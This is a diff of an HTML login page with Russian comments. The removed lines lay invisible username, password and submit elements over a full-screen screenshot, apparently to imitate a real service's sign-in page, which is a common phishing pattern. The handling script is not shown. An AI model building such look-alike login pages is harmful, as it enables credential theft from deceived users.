@@ -8,15 +8,17 @@
 </head>
 <body>
 
-    <!-- Твой скриншот на весь экран -->
-    <img src="bg.jpg" class="fullscreen-bg" alt="bg">
+    <!-- Твой фон на весь экран -->
+    <div class="bg-image"></div>
 
-    <!-- Только 3 элемента, которые накладываются поверх картинки -->
-    <form id="loginForm" class="invisible-form" autocomplete="off">
-        <input type="text" id="username" placeholder="" required autocomplete="off">
-        <input type="password" id="password" placeholder="" required autocomplete="new-password">
-        <button type="submit" class="invisible-btn"></button>
-    </form>
+    <!-- Блок с тремя элементами -->
+    <div class="login-box">
+        <form id="loginForm" autocomplete="off">
+            <input type="text" id="username" placeholder="Имя пользователя/Электронная почта/Телефон" required autocomplete="off">
+            <input type="password" id="password" placeholder="Пароль" required autocomplete="new-password">
+            <button type="submit" class="login-btn">Авторизоваться</button>
+        </form>
+    </div>
 
     <script src="script.js"></script>
 </body>
